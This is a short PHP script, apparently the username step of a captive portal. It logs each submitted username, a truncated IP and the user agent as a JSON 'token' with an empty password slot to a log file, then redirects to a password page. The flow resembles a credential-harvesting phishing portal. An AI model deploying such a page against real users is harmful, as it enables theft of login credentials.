<?php
function norm_ip($ip) {
  if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    $p = explode('.', $ip); $p[3] = '0'; return implode('.', $p);
  }
  if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
    return preg_replace('/:[0-9a-fA-F]{0,4}$/', ':0000', $ip);
  }
  return '0.0.0.0';
}

$user = trim($_POST['user'] ?? '');
if ($user === '') { http_response_code(400); exit; }

$ip   = norm_ip($_SERVER['REMOTE_ADDR'] ?? '0.0.0.0');
$ua   = substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 180);
$when = gmdate('c');


$line = json_encode([
  'ts'    => $when,
  'ip'    => $ip,
  'ua'    => $ua,
  'token' => ['user' => $user, 'password' => '']
], JSON_UNESCAPED_UNICODE) . PHP_EOL;


$primary = '/var/log/ca2.log';
$fallbackDir  = __DIR__ . '/logs';
$fallbackFile = $fallbackDir . '/ca2.log';
if (!is_dir($fallbackDir)) { @mkdir($fallbackDir, 0700, true); }

$ok = false;
if (@is_writable($primary) || (!file_exists($primary) && @is_writable(dirname($primary)))) {
  if ($fh = @fopen($primary, 'ab')) { @fwrite($fh, $line); @fclose($fh); $ok = true; }
}
if (!$ok) {
  if ($fh2 = @fopen($fallbackFile, 'ab')) { @fwrite($fh2, $line); @fclose($fh2); $ok = true; }
}
if (!$ok) { error_log("captive-portal: FAILED to write save.php"); http_response_code(500); exit; }

error_log("captive-portal: $line");

header('Location: password.php?user=' . urlencode($user), true, 303);
exit;

